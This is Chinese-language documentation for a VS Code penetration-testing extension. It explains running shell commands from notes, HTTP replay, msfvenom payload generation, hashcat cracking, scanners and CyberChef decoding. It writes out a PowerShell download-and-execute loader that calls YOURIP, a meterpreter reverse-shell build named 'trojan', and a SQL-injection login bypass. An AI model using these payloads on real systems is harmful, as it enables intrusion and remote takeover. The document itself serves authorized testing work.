# 攻击工作流

本指南将逐步介绍 Weaponized VSCode 中面向攻击的功能：从笔记中运行 shell 命令、重放 HTTP 请求、生成载荷、破解哈希、扫描目标以及解码文本。每个章节展示你在渗透测试中将使用的实际工作流。

::: tip 前置条件
请确保你已经[搭建好工作区](./getting-started.md)并创建了至少一个主机笔记后再继续。许多功能依赖当前主机状态来自动填充 `$TARGET`、`$RHOST` 和 `$IP` 等变量。
:::

## CodeLens Shell 运行器

当你编辑 `hosts/`、`users/` 或 `services/` 目录中的 Markdown 文件时，扩展会扫描每个代码围栏块以查找可执行的 shell 语言。标记为 `zsh`、`bash`、`sh` 或 `powershell` 的代码块会在开始围栏上方直接显示两个可点击的 **CodeLens** 按钮：

- **Run command in terminal** -- 将整个代码块内容发送到活动的 VS Code 终端。如果没有打开终端，会自动创建一个。
- **Copy commands** -- 将代码块内容复制到剪贴板。

### 编写可执行代码块

在任何笔记中添加 shell 命令，方式与编写普通 Markdown 代码围栏相同：

````markdown
```bash
nmap -sC -sV -oN nmap/initial $TARGET
```
````

当你点击 **Run command in terminal** 时，扩展会将命令粘贴到当前聚焦的终端并执行。`$TARGET`、`$RHOST`、`$IP`、`$LHOST` 和 `$LPORT` 等环境变量会从工作区状态自动填充，因此你无需硬编码 IP 地址。

### 多行代码块

代码块可以包含多条命令。块中的每一行都会发送到终端：

````markdown
```bash
mkdir -p nmap
nmap -sC -sV -oN nmap/initial $TARGET
nmap -p- -oN nmap/all-ports $TARGET
```
````

点击一次，所有三条命令将在终端中依次执行。

### PowerShell 代码块

同样的 CodeLens 也适用于 PowerShell。这对 Windows 后渗透笔记非常有用：

````markdown
```powershell
Get-ADUser -Filter * -Properties MemberOf | Select-Object Name, SamAccountName
Import-Module .\PowerView.ps1
Get-DomainUser -Identity admin
```
````

### 实用模式：一次编写，随时运行

核心理念是你的笔记成为一本**操作手册**。在渗透测试过程中，将你运行的每条命令写入相关的主机或服务笔记。下次遇到类似目标时，打开旧笔记并点击 CodeLens 按钮即可 -- 无需重新输入，无需翻找命令历史。

::: tip
保留一份 `services/http/http.md` 笔记，其中包含常用的 Web 枚举命令。当你在新项目中遇到 HTTP 服务时，这些命令只需点击一下即可运行。
:::

## HTTP 重放器

带有 `http` 语言标签的代码围栏块会获得四个 CodeLens 操作：

| CodeLens 按钮 | 行为 |
|----------------|----------|
| **Send HTTP Request** | 通过 HTTP 发送原始请求并显示响应 |
| **Send HTTPS Request** | 通过 HTTPS 发送原始请求，禁用 TLS 验证 |
| **Copy in curl (HTTP)** | 转换为 `curl` 命令（HTTP）并复制到剪贴板 |
| **Copy in curl (HTTPS)** | 转换为 `curl` 命令（HTTPS）并复制到剪贴板 |

### 请求格式

在 `http` 代码围栏块中编写标准的原始 HTTP 请求：

````markdown
```http
GET /api/users HTTP/1.1
Host: target.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```
````

`Host` 头决定目标服务器。扩展从协议前缀（`http://` 或 `https://`）加上 `Host` 头的值加上请求 URI 构建完整的 URL。

### POST 请求示例

````markdown
```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json
Content-Length: 50

{"username": "admin", "password": "SuperSecret123"}
```
````

空行将头部与正文分隔，与原始 HTTP 格式完全一致。

### 响应展示

当你点击 **Send HTTP Request** 或 **Send HTTPS Request** 时，扩展在内部使用 `node-fetch` 发送请求，并在**并排虚拟文档**中打开完整的 HTTP 响应。响应包含状态行、所有头部和正文：

```
HTTP/1.1 200 OK
content-type: application/json
x-powered-by: Express

{"users": [{"id": 1, "name": "admin"}]}
```

响应文档在笔记旁边打开，这样你可以比较请求和响应，无需切换标签页。

::: warning
**HTTPS 模式禁用了 TLS 证书验证**（`rejectUnauthorized: false`）。这是有意为之的 -- 渗透测试目标经常使用自签名证书。不要在需要证书验证的生产系统上使用此功能。
:::

### Curl 转换

**Copy in curl** 操作将原始 HTTP 代码块转换为等效的 `curl` 命令，复制到剪贴板，并在虚拟文档中显示。当你需要在 VS Code 外部运行请求或与队友共享时非常方便：

```bash
curl -X POST "http://target.htb/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "SuperSecret123"}'
```

### 实用模式：笔记中的 Burp 风格重放器

从你的代理中捕获一个有趣的请求，将其作为 `http` 代码块粘贴到主机笔记中，随时点击一下即可重放。内联修改头部或参数并重新发送。这为你提供了一个完全在 VS Code 内部的轻量级 Burp Repeater 工作流。

````markdown
## 认证绕过尝试

```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json

{"username": "admin' OR 1=1--", "password": "x"}
```

```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json

{"username": "admin", "password": "", "role": "admin"}
```
````

每个代码块都可以独立执行 -- 点击你想测试的那个即可。

## 载荷生成 (msfvenom)

通过交互式向导生成 msfvenom 载荷，无需记忆命令行参数。

**命令：** `Weapon: Create msfvenom payload`
**命令 ID：** `weapon.task.msfvenom_creation`

### 交互式向导步骤

向导通过 QuickPick 菜单引导你完成五个步骤：

**步骤 1 -- 选择载荷类型。** 从 11 个内置选项中选择：

| 载荷 |
|---------|
| `windows/x64/meterpreter/reverse_tcp` |
| `windows/meterpreter/reverse_tcp` |
| `linux/x64/meterpreter/reverse_tcp` |
| `linux/x86/meterpreter/reverse_tcp` |
| `php/meterpreter/reverse_tcp` |
| `python/meterpreter/reverse_tcp` |
| `windows/meterpreter/reverse_http` |
| `windows/x64/meterpreter/reverse_http` |
| `windows/meterpreter/reverse_https` |
| `windows/x64/meterpreter/reverse_https` |
| `java/meterpreter/reverse_tcp` |

**步骤 2 -- 选择输出格式。** 从 21 个选项中选择：

`exe`, `elf`, `psh`, `dll`, `hta-psh`, `psh-cmd`, `psh-net`, `psh-reflection`, `elf-so`, `exe-service`, `raw`, `raw | xxd -i`, `jsp`, `jar`, `war`, `pl`, `asp`, `aspx`, `msi`, `python-reflection`, `vba`, `vba-exe`, `vba-psh`, `vbs`

::: info
`psh` 格式会生成一个带有加载器的 PowerShell 载荷。使用 `IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/<output>.ps1')` 可以在内存中加载。`raw | xxd -i` 选项以 C 数组格式输出 shellcode（重定向到 `/dev/stdout` 效果最佳）。
:::

**步骤 3 -- 选择高级选项（多选）。** 选择零个或多个：

| 选项 | 效果 |
|--------|--------|
| `PrependMigrate=true PrependMigrateProc=explorer.exe` | 执行时自动迁移到 explorer.exe |
| `PrependFork=true` | 运行载荷前进行 fork |
| `PrependSetuid=true` | 载荷前调用 `setuid(0)` |
| `PrependSetresuid=true` | 载荷前调用 `setresuid(0,0,0)` |
| `PrependSetreuid=true` | 载荷前调用 `setreuid(0,0)` |
| `PrependChrootBreak=true` | 尝试 chroot 逃逸 |
| `AutoSystemInfo=false` | 禁用自动系统信息收集 |

**步骤 4 -- 输入输出文件名。** 默认值：`./trojan`。支持 VS Code 变量，如 `${workspaceFolder}/payloads/shell`。

**步骤 5 -- 是否启动监听器？** 选择 **Yes** 将自动在第二个终端面板中启动一个 `multi/handler`，并使用匹配的载荷、LHOST 和 LPORT。

### 生成的命令

向导会组装并在 VS Code 终端中运行最终的 msfvenom 命令：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  PrependMigrate=true PrependMigrateProc=explorer.exe \
  -o ./trojan -f exe
```

如果你选择了启动监听器，第二个终端会打开并运行：

```bash
msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run -j'
```

### 配置

| 设置项 | 默认值 | 描述 |
|---------|---------|-------------|
| `weaponized.msf.venom` | -- | `msfvenom` 二进制文件的路径（必填） |
| `weaponized.lhost` | -- | 你的攻击者 IP，用作 LHOST |
| `weaponized.lport` | `6789` | 你的攻击者端口，用作 LPORT |

在 `.vscode/settings.json` 中设置这些配置：

```json
{
  "weaponized.msf.venom": "/usr/bin/msfvenom",
  "weaponized.lhost": "10.10.14.5",
  "weaponized.lport": 4444
}
```

::: tip
在 Kali Linux 上，`msfvenom` 通常位于 `/usr/bin/msfvenom`。如果你使用自定义安装的 Metasploit，请将设置指向你的二进制文件路径。
:::

## 哈希破解 (hashcat)

通过交互式向导启动 hashcat，处理模式选择、哈希类型和设备目标。

**命令：** `Weapon: Crack hashes with hashcat`
**命令 ID：** `weapon.task.hashcat_cracker`

### 交互式向导步骤

**步骤 1 -- 选择哈希文件。** 文件选择器会打开，让你浏览工作区。导航到包含哈希值的文件（例如 `loot/hashes.txt`）。

**步骤 2 -- 选择攻击模式。**

| 模式 | Hashcat 参数 | 描述 |
|------|-------------|-------------|
| HASHCAT_MODE_WORDLIST | `-a 0` | 标准字典攻击 |
| HASHCAT_MODE_COMBINATION | `-a 1` | 组合两个字典 |
| HASHCAT_MODE_TOGGLE_CASE | `-a 2` | 对字典进行大小写切换 |
| HASHCAT_MODE_MASK_BRUTE_FORCE | `-a 3` | 使用掩码暴力破解 |
| HASHCAT_MODE_WORDLIST_MASK | `-a 6` | 混合模式：字典 + 掩码 |
| HASHCAT_MODE_MASK_WORDLIST | `-a 7` | 混合模式：掩码 + 字典 |

**步骤 3 -- 选择哈希类型。** 覆盖最常见渗透测试场景的完整列表：

| 标签 | Hashcat `-m` | 示例 |
|-------|-------------|----------|
| HASH_MD5 | 0 | 原始 MD5 |
| HASH_SHA1 | 100 | 原始 SHA1 |
| HASH_MD5CYPT | 500 | md5crypt (`$1$`) |
| HASH_MD4 | 900 | 原始 MD4，NTLM 输入 |
| HASH_NTLM | 1000 | Windows NTLM |
| HASH_SHA256 | 1400 | 原始 SHA-256 |
| HASH_APRMD5 | 1600 | Apache APR1 (`$apr1$`) |
| HASH_SHA512 | 1800 | sha512crypt (`$6$`) |
| HASH_BCRYPT | 3200 | bcrypt (`$2a$`, `$2b$`) |
| HASH_NETNTLMv2 | 5600 | NetNTLMv2（Responder 捕获） |
| HASH_SHA256CRYPT | 7400 | sha256crypt (`$5$`) |
| HASH_KRB5_PA_23 | 7500 | Kerberos Pre-Auth etype 23 |
| HASH_DJANGO_PBKDF2_SHA256 | 10000 | Django PBKDF2-SHA256 |
| HASH_PBKDF2_HMAC_SHA256 | 10900 | PBKDF2-HMAC-SHA256 |
| HASH_KRB5_TGS_23 | 13100 | Kerberoasting (etype 23) |
| HASH_JWT | 16500 | JWT (JSON Web Token) |
| HASH_KRB5_AS_REP_23 | 18200 | AS-REP Roasting (etype 23) |
| HASH_KRB5_PA_17 | 19800 | Kerberos Pre-Auth etype 17 |
| HASH_KRB5_PA_18 | 19900 | Kerberos Pre-Auth etype 18 |
| HASH_KRB5_AS_REP_17 | 19500 | AS-REP Roasting (etype 17) |
| HASH_KRB5_TGS_17 | 19600 | Kerberoasting (etype 17) |
| HASH_KRB5_TGS_18 / HASH_KRB5_AS_REP_18 | 19700 | Kerberos etype 18 (TGS/AS-REP) |

**步骤 4 -- 选择设备类型。**

| 设备 | 参数 |
|--------|------|
| GPU | `-D 2` |
| CPU | `-D 1` |
| FPGA | `-D 3` |

**步骤 5 -- 输入字典或掩码。** 默认值：`$ROCKYOU`。暴力破解模式下，输入如 `?a?a?a?a?a?a?a?a` 的掩码。

::: tip
在 `.vscode/settings.json` 的 `weaponized.envs` 下设置 `ROCKYOU` 环境变量，这样 `$ROCKYOU` 会在每个终端中解析为你的字典路径：

```json
{
  "weaponized.envs": {
    "ROCKYOU": "/usr/share/wordlists/rockyou.txt"
  }
}
```
:::

### 生成的命令

向导会组装命令并在 VS Code 终端（编辑器面板）中运行：

```bash
hashcat --force -a 0 -m 1000 -D 2 loot/hashes.txt /usr/share/wordlists/rockyou.txt
```

### 配置

| 设置项 | 默认值 | 描述 |
|---------|---------|-------------|
| `weaponized.hashcat` | `hashcat` | hashcat 二进制文件的路径 |

## 网络扫描

针对目标启动可配置的网络扫描器，支持自动目标选择。

**命令：** `Weapon: Run scanner over target`
**命令 ID：** `weapon.task.scan`

### 交互流程

**步骤 1 -- 选择目标。**

扩展会读取你当前的主机状态。根据情况不同：

- **一个活动主机：** 自动选择该主机。
- **多个活动主机：** QuickPick 以 `主机名 (IP)` 的格式显示每个主机，供你选择。
- **未找到主机：** 弹出自由文本输入框，要求你手动输入目标。

选择主机后，第二个 QuickPick 显示该主机的可用标识符 -- 主机名、IP 地址和任何别名。选择扫描器需要的标识形式。

**步骤 2 -- 选择扫描器。**

QuickPick 列出 `weaponized.scanners` 中定义的每个扫描器。选择你需要的扫描器。

**步骤 3 -- 执行。**

扩展将扫描器命令中的每个 `$TARGET` 替换为你选择的标识符，并在 VS Code 终端面板中运行命令。

### 默认扫描器

以下扫描器为开箱即用。所有扫描器均可在设置中配置：

| 扫描器 | 命令 |
|---------|---------|
| rustscan | `rustscan -a $TARGET -- --script=vuln -A` |
| wfuzz subdomain | `wfuzz -c -w <dns_wordlist> -u http://$TARGET -H 'Host: FUZZ.$TARGET' --hc 404` |
| ffuf subdomain | `ffuf -c -w <dns_wordlist> -u http://$TARGET -H 'Host: FUZZ.$TARGET' -fc 404` |
| wfuzz https subdomains | `wfuzz -c -w <dns_wordlist> -u https://$TARGET -H 'Host: FUZZ.$TARGET' --hc 404` |
| ffuf https subdomains | `ffuf -c -w <dns_wordlist> -u https://$TARGET -H 'Host: FUZZ.$TARGET' -fc 404` |
| nuclei | `nuclei -target $TARGET` |
| dirsearch | `dirsearch -u http://$TARGET` |
| dirsearch https | `dirsearch -u https://$TARGET` |
| feroxbuster | `feroxbuster -u http://$TARGET -w <dir_wordlist> -x php,html,txt -t 50` |
| feroxbuster https | `feroxbuster -u https://$TARGET -w <dir_wordlist> -x php,html,txt -t 50` |

::: info
上面的 `<dns_wordlist>` 和 `<dir_wordlist>` 占位符对应 `weaponized.user_vars.dns_top100000` 和 `weaponized.user_vars.dir_raft_medium` 设置。请将它们配置为指向你的字典文件。
:::

## 添加自定义扫描器

在 `.vscode/settings.json` 中覆盖或扩展扫描器列表：

```json
{
  "weaponized.scanners": {
    "my-custom-scan": "custom-tool --target $TARGET --output results.txt",
    "nikto": "nikto -h http://$TARGET",
    "nmap-full": "nmap -sS -sV -O -A -T4 --script vuln $TARGET",
    "masscan": "masscan -p1-65535 $TARGET --rate=1000"
  }
}
```

规则：

- 每个键是 QuickPick 中显示的扫描器名称。
- 每个值是命令模板。`$TARGET` 在运行时会被替换为你选择的主机标识符。
- 你可以引用 VS Code 配置变量：`${config:weaponized.user_vars.my_wordlist}` 可在扫描器命令中使用。
- 扫描器在 VS Code 终端（编辑器面板）中运行，因此你可以实时查看输出并与进程交互。

### 实用模式：按项目配置扫描器

按工作区自定义扫描器列表。在你项目的 `.vscode/settings.json` 中，添加针对目标环境的特定扫描器：

```json
{
  "weaponized.scanners": {
    "smb-enum": "crackmapexec smb $TARGET --shares -u '' -p ''",
    "ldap-search": "ldapsearch -x -H ldap://$TARGET -b 'DC=corp,DC=local'",
    "snmp-walk": "snmpwalk -v2c -c public $TARGET"
  }
}
```

下次运行 `Weapon: Run scanner over target` 时，你的自定义条目会与默认条目一起显示。

## 文本解码

使用 CyberChef 的自动检测功能直接在 VS Code 内解码选中的文本。

**命令：** `Weapon: Decode selected text`
**命令 ID：** `weapon.magic_decoder`

### 工作原理

1. **选择文本** -- 在任意编辑器中高亮一个 base64 字符串、十六进制编码的数据、URL 编码的载荷或任何你想解码的内容。
2. **运行命令** -- 从命令面板执行（`Ctrl+Shift+P` > `Weapon: Decode selected text`）。
3. **CyberChef 打开** -- 在 VS Code 的 Simple Browser 面板中打开，并预先应用 **Magic** 配方。

Magic 配方使用深度为 5 的自动检测，这意味着 CyberChef 会尝试多种解码策略并选择最可能的结果。它可以自动处理：

- Base64（标准和 URL 安全变体）
- 十六进制
- URL 编码 / 百分号编码
- 旋转密码（ROT13 等）
- 嵌套编码（例如 base64 编码的十六进制）

### 示例工作流

你在 HTTP 响应中发现了一个可疑的 cookie 值：

```
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QifQ==
```

选中文本，运行解码命令，CyberChef 立即显示：

```json
{"user":"admin","role":"guest"}
```

::: tip
这也适用于 JWT 令牌。选中整个 JWT 字符串，CyberChef 会解码头部和载荷部分，显示声明和算法详情。
:::

### 无需外部浏览器

CyberChef 从 `https://gchq.github.io/CyberChef` 加载到 VS Code 内置的 Simple Browser 中。你选中的文本会经过 base64 编码后作为 URL 参数传递，因此在页面加载之前不会离开你的机器。一切都在编辑器窗口内完成。

## 综合运用

以下是在单个项目中使用这些工作流的典型攻击流程：

1. **搭建工作区**并为 `target.htb` 创建主机笔记。
2. **运行扫描器** -- 使用 `Weapon: Run scanner over target` 配合 rustscan 查找开放端口。
3. **向主机笔记中添加命令** -- 将 `nmap`、`gobuster` 和其他命令以 `bash` 代码块形式写入。
4. **从笔记中执行** -- 点击 CodeLens 运行每条命令。输出显示在终端中，而命令保留在笔记中作为记录。
5. **捕获 HTTP 请求** -- 将代理中的有趣请求粘贴为 `http` 代码块，修改后重放。
6. **生成载荷** -- 使用 `Weapon: Create msfvenom payload` 构建反向 shell 并自动启动监听器。
7. **破解捕获的哈希** -- 使用 `Weapon: Crack hashes with hashcat` 破解从 secretsdump 获取的 NTLM 哈希。
8. **解码令牌** -- 选中 JWT 或 base64 数据，使用 CyberChef 解码以发现硬编码的密钥。

每条命令、请求和发现都保存在你的 Markdown 笔记中 -- 完全可复现、可审计，随时可用于报告撰写。

## 从 v0.4.x 迁移

::: info 从 v0.4.x 迁移？
如果你使用过旧版本的扩展，以下是工作流的变化：

| 旧版 (v0.4.x) | 新版 (v0.5+) |
|--------------|-------------|
| `Tasks: Run Task` > 从列表中选择 | 直接使用命令面板命令：`Weapon: Create msfvenom payload`、`Weapon: Crack hashes with hashcat`、`Weapon: Run scanner over target` |
| "run command with selection" 任务 | 在任何 `bash`/`sh`/`zsh`/`powershell` 代码块上使用 CodeLens **Run command in terminal** |
| 在 `.vscode/tasks.json` 中定义任务 | 内置于扩展中 -- 无需 JSON 配置 |
| rustscan 任务需手动输入目标 | `Weapon: Run scanner over target` 自动使用笔记中的当前主机 |
| 在终端中手动执行 `msfvenom` 命令 | 交互式向导，自动填充 LHOST/LPORT 并可选自动启动监听器 |
| 手动执行 `hashcat` 命令并记忆参数 | 交互式向导，提供哈希类型/模式菜单和文件选择器 |

核心理念不变：**笔记驱动你的工作流**。不同之处在于工具集成现在内置于扩展中，通过引导式向导代替了 VS Code 任务。
:::
